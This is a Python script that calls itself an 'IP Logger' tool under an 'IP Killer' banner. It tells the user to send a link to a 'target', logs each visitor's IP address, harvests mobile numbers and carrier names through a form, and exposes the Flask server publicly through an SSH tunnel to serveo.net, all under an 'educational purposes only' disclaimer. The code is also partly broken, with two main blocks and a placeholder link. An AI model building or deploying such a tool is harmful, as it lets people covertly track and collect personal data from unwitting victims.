from flask import Flask, request, render_template
import os
from datetime import datetime
import subprocess
import threading
import time
import os
import time

def banner():
    os.system('clear')  # Clears the terminal screen
    print("""
\033[1;31m██╗██████╗     ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
\033[1;31m██║██╔══██╗    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
\033[1;31m██║██████╔╝    █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
\033[1;31m██║██╔═══╝     ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔═══╝ 
\033[1;31m██║██║         ██║  ██╗██║███████╗███████╗███████╗██║     
\033[1;31m╚═╝╚═╝         ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝     
\033[0m
Welcome to the IP Logger tool.
Use this tool to generate a link for capturing IP addresses.
Note: This is for educational purposes only.
    """)

def main():
    banner()
    print("Do you want to start link generation?")
    print("\n[1] Generate link\n[2] Exit the framework")

    choice = input("\nEnter your choice: ")

    if choice == '1':
        print("\nGenerating link...")
        time.sleep(1)
        # Add your link generation logic here
        print("Link: https://your-ip-logger-link.example")
        print("Send this link to your target to capture IP.")
    elif choice == '2':
        print("\nExiting... Goodbye!")
        time.sleep(1)
        exit()
    else:
        print("\nInvalid choice. Please try again.")
        time.sleep(1)
        main()

if __name__ == "__main__":
    main()

app = Flask(__name__)

# Directory to save mobile number/provider data
MOBILE_DIR = "mobile"
os.makedirs(MOBILE_DIR, exist_ok=True)

# File to store visitor IPs
IP_FILE = "visitor_ips.txt"

@app.route('/')
def index():
    """Render the HTML page."""
    return render_template("index.html")

@app.route('/log_ip', methods=['POST'])
def log_ip():
    """Log the visitor's IP address to a text file."""
    visitor_ip = request.remote_addr
    with open(IP_FILE, "a") as f:
        f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - IP: {visitor_ip}\n")
    return "IP logged!", 200

@app.route('/submit_form', methods=['POST'])
def submit_form():
    """Log mobile number and service provider when the form is submitted."""
    mobile_number = request.form.get('mobile_number')
    provider = request.form.get('provider')

    file_path = os.path.join(MOBILE_DIR, "mobile.txt")
    with open(file_path, "a") as f:
        f.write(f"Mobile Number: {mobile_number}, Provider: {provider}\n")

    return "Form submitted successfully!", 200

def run_flask():
    """Run the Flask app."""
    app.run(host='0.0.0.0', port=5000)

def start_serveo():
    """Start the Serveo tunnel."""
    subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'])

if __name__ == "__main__":
    run_flask_thread = threading.Thread(target=run_flask)
    run_flask_thread.start()

    time.sleep(2)

    print("Starting Serveo tunnel...")
    start_serveo()

    print("Your public link is:")
    print("https://<your_username>.serveo.net")  # Replace <your_username> with your actual Serveo username
